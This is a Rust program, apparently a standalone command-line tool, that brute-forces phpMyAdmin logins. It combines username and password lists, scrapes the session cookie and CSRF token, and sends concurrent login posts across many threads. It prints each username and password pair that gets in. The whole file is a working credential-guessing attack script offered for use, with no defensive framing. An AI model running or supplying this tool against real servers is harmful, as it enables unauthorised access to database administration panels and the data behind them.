use std::env;
use std::process;
use std::fs::File;
use std::io::{BufReader, BufRead};
use std::path::Path;
use std::error::Error;
use std::time::Duration;

use tokio::task;
use indicatif::{ProgressBar, ProgressStyle};
use console::Style;

#[tokio::main]
async fn main() {
    let green = Style::new().green();
    let red = Style::new().red();
    let args: Vec<String> = env::args().collect();
    if args.len() != 6 {
        println!("{}: {} <url (https://example.com/phpmyadmin/index.php)> <user_file> <pass_file> <thread_count> <server (usually 1)>", green.apply_to("Usage"), args[0]);
        process::exit(1);
    }
    let url = &args[1];
    let user_lines = read_lines(Path::new(&args[2]));
    panic_if_empty(&user_lines.len(), "user");
    let pass_lines = read_lines(Path::new(&args[3]));
    panic_if_empty(&pass_lines.len(), "pass");
    let wordlist = generate_wordlist(user_lines, pass_lines);
    let mut thread_count = match args[4].parse::<i32>() {
        Err(why) => panic!("[{}] Could not set thread count ({}): {}", Style::new().red().apply_to("PROBLEM"), &args[4], why),
        Ok(thread_count) => thread_count.to_owned(),
    };
    if &thread_count <= &0 {
        panic!("[{}] The thread count ({}) must be a positive number", red.apply_to("PROBLEM"), &thread_count);
    }
    if thread_count as usize > wordlist.len()  {
        thread_count = wordlist.len() as i32;
    }
    let total_words = wordlist.len() as u64;
    let mut finished_words = 0;
    let pb = ProgressBar::new(total_words);
    pb.set_style(ProgressStyle::default_bar().template("{spinner:.green} [{elapsed_precise}] [{wide_bar:.cyan/blue}] {pos}/{len} ({eta})").progress_chars("#>-"));
    let (tx1, rx1) = flume::unbounded();
    let (tx2, rx2) = flume::unbounded();
    let (tx3, rx3) = flume::unbounded();
    for word in wordlist {
        tx1.send(word).expect("Could not initialize the wordlist");
    }
    task::spawn(async move {
        while finished_words < total_words {
            let result = match rx2.recv() {
                Err(why) => panic!("[{}] Internal: {}", red.apply_to("PROBLEM"), why),
                Ok(result) => result,
            };
            finished_words += result;
            pb.set_position(finished_words);
        };
    });
    println!("[{}] Starting attack..", green.apply_to("STATUS"));
    let mut threads = vec![];
    for _ in 1..thread_count+1 {
        let rx1_clone = rx1.clone();
        let tx2_clone = tx2.clone();
        let tx3_clone = tx3.clone();
        let client = reqwest::Client::builder().cookie_store(true).timeout(Duration::from_secs(10)).build().unwrap();
        let curl = url.to_owned();
        let server = args[5].to_owned();
        //let init_cookie = Cookie::new();
        threads.push(task::spawn(async move {
            let mut result = match perform_initial_request(&client, &curl).await {
                Err(why) => panic!("[{}] Connecting (initial request): {}", Style::new().red().apply_to("PROBLEM"), why),
                Ok(result) => result,
            };
            while let Ok(task) = rx1_clone.try_recv() {
                result = match perform_request(&client, &curl, &server, &result, &task).await {
                    Err(why) => panic!("[{}] Connecting to {}: {}", Style::new().red().apply_to("PROBLEM"), &curl, why),
                    Ok(result) => result,
                };
                if result.0 {
                    tx3_clone.send(task).unwrap();
                }
                tx2_clone.send(1).unwrap();
            }
        }));
    }
    for thread in threads {
        match thread.await {
            Err(_) => panic!("[{}] Waiting for threads", Style::new().red().apply_to("PROBLEM")),
            Ok(_) => (),
        };
    }
    let strong_green = Style::new().green().bold();
    let mut found = 0;
    while let Ok(valid) = rx3.try_recv() {
        found += 1;
        println!("[{}] Username: {}, password: {}", strong_green.apply_to("VALID"), valid[0], valid[1])
    };
    println!("[{}] Finished! {} valid credentials found", green.apply_to("STATUS"), found);
}

fn generate_wordlist(user_lines: Vec<String>, pass_lines: Vec<String>) -> Vec<Vec<String>> {
    let mut wordlist = Vec::new();
    let combination = Vec::new();
    for user_line in &user_lines {
        for pass_line in &pass_lines {
            let mut combination_clone = combination.clone();
            combination_clone.push(user_line.to_owned());
            combination_clone.push(pass_line.to_owned());
            wordlist.push(combination_clone.to_owned());
        }
    }
    wordlist
}

fn panic_if_empty(length: &usize, name: &str) {
    match length {
        0 => panic!("[{}] No lines in {} file", Style::new().red().apply_to("PROBLEM"), name),
        _ => {},
    }
}

fn read_lines(path: &Path) -> Vec<String> {
    let file = match File::open(path) {
        Err(why) => panic!("[{}] Could not open {}: {}", Style::new().red().apply_to("PROBLEM"), path.display(), why),
        Ok(file) => file,
    };
    let reader = BufReader::new(file);
    let mut lines = Vec::new();
    for line in reader.lines() {
        let good_line = match line {
            Err(why) => panic!("[{}] Could not read from {}: {}", Style::new().red().apply_to("PROBLEM"), path.display(), why),
            Ok(good_line) => good_line,
        };
        lines.push(good_line);
    }
    lines
}

async fn perform_initial_request(client: &reqwest::Client, url: &String) -> Result<(bool, String, String), Box<dyn Error>> {
    let request = client.get(url);
    let response = request.send().await?;
    let cookie = match response.cookies().nth(0) {
        None => panic!("[{}] Are you sure you gave me the right path to phpmyadmin?", Style::new().red().apply_to("PROBLEM")),
        Some(result) => result,
    }.value().to_owned();
    let source = response.text().await.unwrap().to_owned();
    let start_substring = "name=\"token\" value=\"";
    let start_index = source.find(start_substring).unwrap()+start_substring.len();
    let token = source[start_index..start_index+32].to_owned();
    Ok((false, cookie, token))
}

async fn perform_request(client: &reqwest::Client, url: &String, server: &String, provided_data: &(bool, String, String), credentials: &Vec<String>) -> Result<(bool, String, String), Box<dyn Error>> {
    let request_body = "set_session=".to_owned() + &provided_data.1 + "&pma_username=" + &credentials[0] + "&pma_password=" + &credentials[1] + "&server=" + server + "&route=%2F&lang=en&token=" + &provided_data.2;
    let request = client.post(url.to_owned()+"?route=/").body(request_body).header("Content-Type", "application/x-www-form-urlencoded");
    let response = request.send().await?;
    let cookie = response.cookies().nth(response.cookies().count()-1).unwrap().value().to_owned();
    let source = response.text().await.unwrap().to_owned();
    let start_substring = "name=\"token\" value=\"";
    let start_index = source.find(start_substring).unwrap()+start_substring.len();
    let token = source[start_index..start_index+32].to_owned();
    let correct = source.contains("Home");
    Ok((correct, cookie, token))
}